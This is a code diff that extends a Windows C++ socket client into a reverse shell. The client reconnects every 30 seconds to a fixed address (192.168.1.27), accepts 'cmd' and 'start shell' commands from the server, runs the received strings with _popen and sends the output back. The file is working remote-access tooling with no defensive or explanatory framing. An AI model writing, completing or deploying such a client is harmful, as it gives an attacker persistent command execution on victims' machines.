@@ -13,14 +13,20 @@ using namespace std;
 #define SUCCESS 0
 
 int connect_to_server(const char* addr);
-void recv_from_server(int fd);
+void shell_to_server(int fd);
+void command(int fd);
 int receipt_confirmation(int sock,int check);
+bool startsWith(const char *pre, const char *str);
 
 int main()
 {
     WSADATA WSAData;
     WSAStartup(MAKEWORD(2,0), &WSAData);
-    connect_to_server("192.168.1.27");
+    while(1)
+    {
+        connect_to_server("192.168.1.27");
+        Sleep(30000);
+    }
     WSACleanup();
     return 0;
 }
@@ -30,7 +36,8 @@ int connect_to_server(const char* addr)
 {
     int sock;
     struct sockaddr_in server;
-
+    int len;
+    char str[BUFFERSIZE];
     sock = socket(PF_INET,SOCK_STREAM,0);
     if(sock==-1)
     {
@@ -48,15 +55,77 @@ int connect_to_server(const char* addr)
         std::cout<<"Error connecting socket..."<<std::endl;
         return -1;
     }
+    while(1)
+    {
+        len = recv(sock,str,sizeof(str)-1,0);
+        if(len>0)
+        {
+            str[len-1]='\0';
+        }else{
+            std::cerr<<"Error recv socket"<<std::endl;
+            return -1;
+        }
+        std::cout<<"action recue :'"<<str<<"'"<<std::endl;
+        if(strcmp(str,"start shell")==0)
+        {
+            std::cout<<"Lets start the shell...!"<<std::endl;
+            shell_to_server(sock);
+        }else if(strcmp(str,"cmd")==0)
+        {
+            printf("lancement de la commande sock\n");
+                command(sock);
+        }
 
-    recv_from_server(sock);
-
+    }
     closesocket(sock);
     return 0;
 
 }
+void command(int fd)
+{
+    const char quit_str[] ="quit: result";
+    char str[BUFFERSIZE];
+    ssize_t len;
+    FILE* fp;
+    len = recv(fd,str,sizeof(str),0);
+    if(len>0)
+    {
+        printf("received :%s\n",str);
+        str[len-1]='\0';
+    }else{
+        std::cerr<<"Error recv command"<<std::endl;
+        return;
+    }
+    printf("Exec command: %s\n",str);
+    fp = _popen(str,"r");
+    if(fp)
+    {
+        while(fgets(str,BUFFERSIZE,fp)!=NULL)
+        {
+            len = send(fd,str,sizeof(str)-1,0);
+            if(len == -1)
+            {
+                std::cerr<<"Error send command result"<<std::endl;
+                return;
+            }
+            if( receipt_confirmation(fd ,RECV)== ERROR)
+            {
+                std::cerr<<"Error receipt confirmation"<<std::endl;
+                return;
+            }
 
-void recv_from_server(int fd)
+        }
+        fclose(fp);
+    }
+    len = send(fd,quit_str,strlen(quit_str),0);
+    if(len==-1)
+    {
+        std::cerr<<"Error quit str"<<std::endl;
+        return;
+    }
+
+}
+void shell_to_server(int fd)
 {
     const char prompt[]="$";
     const char quit_str[] ="quit: result";
@@ -65,14 +134,12 @@ void recv_from_server(int fd)
     FILE *fp;
     while(1)
     {
-
         len = send(fd,prompt,strlen(prompt),0);
         if(len==-1)
         {
             std::cerr<<"Error send prompt"<<std::endl;
             return;
         }
-
         len = recv(fd,str,sizeof(str)-1,0);
         if(len>0)
         {
@@ -85,7 +152,11 @@ void recv_from_server(int fd)
         if(str[0]=='c'&&str[1]=='d')
         {
             chdir(str+3);
-        }else{
+        }else if(startsWith("exit",str))
+        {
+            return;
+        }
+        else{
             fp = _popen(str,"r");
             if(fp)
             {
@@ -154,4 +225,11 @@ int receipt_confirmation(int sock,int check)
     }
 
     return SUCCESS;
+}
+
+bool startsWith(const char *pre, const char *str)
+{
+    size_t lenpre = strlen(pre),
+           lenstr = strlen(str);
+    return lenstr < lenpre ? false : strncmp(pre, str, lenpre) == 0;
 }
